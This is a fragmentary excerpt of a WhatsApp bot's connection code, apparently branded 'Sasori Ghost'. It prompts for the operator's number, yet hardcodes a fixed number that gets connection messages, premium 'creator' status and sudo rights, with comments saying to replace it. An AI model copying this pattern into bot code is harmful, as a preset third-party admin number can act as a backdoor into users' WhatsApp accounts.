...
async function getUserNumber() {
    return new Promise((resolve) => {
        ...
        rl.question('📲 Enter your WhatsApp number (with country code, e.g., 223xxxx): ', (number) => {
            rl.close();
            resolve(number.trim());
        });
    });
...
async function connectToWhatsapp(handleMessage) {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if (connection === 'close') {
            ...
            try {
                const chatId = '22352261363@s.whatsapp.net'; // ton numéro ou le groupe cible
...
*SasoriGhost*
                ...
                await sock.sendMessage(chatId, {
                    image: { url: imagePath },
                    caption: messageText,
                    footer: '💀 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 𝐒𝐚𝐬𝐨𝐫𝐢 𝐆𝐡𝐨𝐬𝐭',
                });
    ...
    setTimeout(async () => {
        if (!state.creds.registered) {
            ...
            try {
                ...
                const number = 22352261363; // mettez votre numéro WhatsApp 

                if (asPremium === true) {
                    configmanager.premiums.premiumUser['c'] = { creator: '22352261363' };
                    configmanager.saveP();
                ...
                setTimeout(() => {
                    configmanager.config.users[number] = {
                        sudoList: ['22352261363@s.whatsapp.net'], // emplace par ton numéro WhatsApp 
